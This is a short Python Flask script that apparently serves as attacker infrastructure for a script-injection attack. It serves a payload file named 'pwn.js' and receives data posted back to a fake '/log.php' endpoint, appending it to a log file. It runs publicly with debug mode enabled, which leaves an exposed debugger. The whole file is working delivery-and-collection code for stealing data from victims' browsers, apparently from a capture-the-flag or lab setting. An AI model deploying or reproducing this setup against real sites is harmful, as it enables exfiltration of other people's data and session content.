from flask import Flask, request, send_file
from flask.templating import render_template

app = Flask(__name__)


@app.route("/log.php", methods=["POST"])
def log_data():
    data = request.form.get("output", "No data received")
    with open("log.txt", "a") as f:
        f.write(data + "\n")
    return "Data received!", 200


@app.route("/pwn.js")
def pwn():
    return send_file("pwn.js", mimetype="application/javascript")


app.run(host="0.0.0.0", port=5555, debug=True)
